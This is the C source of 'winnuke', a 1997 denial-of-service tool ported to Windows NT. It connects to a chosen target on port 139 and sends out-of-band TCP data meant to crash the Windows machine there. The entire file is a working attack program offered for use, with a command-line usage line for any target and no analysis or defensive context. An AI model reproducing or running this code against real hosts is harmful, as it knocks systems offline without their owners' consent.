/* winnuke.c - (05/07/97)  By _eci  */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */

// Windows NT port by Eugene Surovegin <ebs@glasnet.ru>
// Compiled with MS Visual C++ 4.2b, tested on NT 4.0 SP2

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <winsock.h>

#define dport 139  /* Attack port: 139 is what we want */

int open_sock(int sock, char *server, int port)
{
 struct sockaddr_in blah;
 struct hostent *he;
 int res;

 memset((char *)&blah,0,sizeof(blah));
 blah.sin_family=AF_INET;
 blah.sin_addr.s_addr=inet_addr(server);
 blah.sin_port=htons(port);

 if ((he = gethostbyname(server)) != NULL)
  memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length);
 else
  if ((blah.sin_addr.s_addr = inet_addr(server))==INADDR_NONE)
  {
   puts("Cannot resolve host");
   return(-3);
  }

  if (res=connect(sock,(struct sockaddr *)&blah,16)==-1)
  {
   puts("Cannot connect socket");
   return(-4);
  }
 printf("Connected to [%s:%d].\n",server,port);
 return 0;
}

void main(int argc, char *argv[])
{
 int   s;
 char  *str = "Bye";  /* Makes no diff */
 int   port=0;

 if ( (argc<2) || (argc>3))
 {
  printf("Usage: %s <target> [<port>]>\n",argv[0]);
  exit(0);
 }

 if (argc == 3)
  port=atoi(argv[2]);
 if (!port)
  port=dport;

 WSADATA wsaData;
 if (!WSAStartup(MAKEWORD(1, 1), &wsaData))
 {
  if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))!=INVALID_SOCKET)
  {
   if (!open_sock(s,argv[1],port))
   {
    puts("Sending crash... ");
    send(s,str,strlen(str),MSG_OOB);
    puts("Done!");
   }
   else
    printf("Error connecting to host %s",argv[1]);
   closesocket(s);
  }
  else
   puts("Error getting socket");
  WSACleanup();
 }
 else
  puts("Cannot init Winsock");
}
